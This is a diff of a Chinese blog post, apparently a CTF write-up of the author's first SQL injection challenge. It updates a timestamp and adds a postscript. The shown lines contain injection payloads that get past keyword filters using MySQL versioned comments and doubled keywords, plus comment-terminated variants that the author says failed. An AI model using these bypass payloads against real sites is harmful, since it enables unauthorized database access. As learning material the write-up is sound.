@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2017/08/02/记第一道sql注入/index.html">
 <meta property="og:site_name" content="Merl1ng">
 <meta property="og:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
-<meta property="og:updated_time" content="2017-08-02T16:06:20.019Z">
+<meta property="og:updated_time" content="2017-08-03T07:01:27.648Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记第一道sql注入">
 <meta name="twitter:description" content="正在学习sql注入 差不多完整理解了一道注入题把方法和思路记录下来(&amp;gt;ω&amp;lt;)">
@@ -363,6 +363,8 @@
 <p><code>?id=&#39; /*!union*/ /*!select*/ name /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code><br>报错Unknown column ‘name’ in ‘field list’<br>这里比较奇怪 明明之前exists判断出有name列 结果这里联合就报没有这个name列</p>
 <p><em>实际这道题是过滤了关键字后紧挨空格的情况所以可以双写空格关键字绕过</em></p>
 <p>最终的查询语句为<br><code>&#39;unionunion  selectselect  flag fromfrom  flag wherewhere &#39;&#39;=&#39;</code><br>或者<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag /*!where*/ &#39;&#39;=&#39;</code></p>
+<p>后记</p>
+<p>这个题还有比较奇怪的一点是不能用注释 注释掉后面的 ‘<br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--</code><br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag--+</code><br><code>&#39; /*!union*/ /*!select*/ flag /*!from*/ flag#</code><br>都不行 可能也进行了过滤</p>
 
       
     </div>
